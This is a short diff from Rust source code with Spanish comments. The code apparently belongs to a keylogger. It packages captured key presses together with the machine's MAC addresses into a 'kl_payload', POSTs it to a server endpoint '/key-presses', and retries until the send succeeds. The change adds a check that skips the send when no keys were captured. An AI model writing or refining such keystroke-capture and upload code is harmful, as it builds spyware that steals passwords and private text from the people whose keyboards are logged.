@@ -352,20 +352,22 @@ async fn send_server_key_presses_thread(rx: Receiver<KeyPressInfo>) {
             mac_addresses: mac_addresses(),
             key_presses,
         };
-        println!("sending payload to server");
-        // se envía el payload al servidor, y si falla se reintenta
-        // la solicitud hasta que deje de fallar
-        while http_client
-            .post(format!("{}/key-presses", API_URL))
-            .json(&kl_payload)
-            .send()
-            .await
-            .is_err()
-        {
-            println!("retrying send payload to server");
-            // pausar el hilo hasta el tiempo determinado para
-            // reintentar enviar la información al servidor
-            std::thread::sleep(retry_response_duration);
+        if !kl_payload.key_presses.is_empty() {
+            println!("sending payload to server");
+            // se envía el payload al servidor, y si falla se reintenta
+            // la solicitud hasta que deje de fallar
+            while http_client
+                .post(format!("{}/key-presses", API_URL))
+                .json(&kl_payload)
+                .send()
+                .await
+                .is_err()
+            {
+                println!("retrying send payload to server");
+                // pausar el hilo hasta el tiempo determinado para
+                // reintentar enviar la información al servidor
+                std::thread::sleep(retry_response_duration);
+            }
         }
     }
 }
